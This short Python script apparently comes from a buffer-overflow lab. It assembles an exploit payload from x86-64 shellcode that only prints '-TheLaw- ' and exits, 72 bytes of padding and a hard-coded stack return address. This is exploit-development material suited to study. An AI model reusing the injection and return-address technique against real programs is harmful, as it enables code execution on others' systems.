from gen_payload import get_payload

# constants
hellocode = "\x6a\x01\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\xeb\x12\x5e\x48\x31\xd2\xb2\x0d\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xe9\xff\xff\xff\x2d\x54\x68\x65\x4c\x61\x77\x2d\x20"
hellocode_padding_n = 72
initial_address_little_endian = "\x70\xdc\xff\xff\xff\x7f"
# initial_address_little_endian = "\x70\xdc"


payload = get_payload(hellocode, hellocode_padding_n, initial_address_little_endian)
print(payload)

# loop through the address of the buffer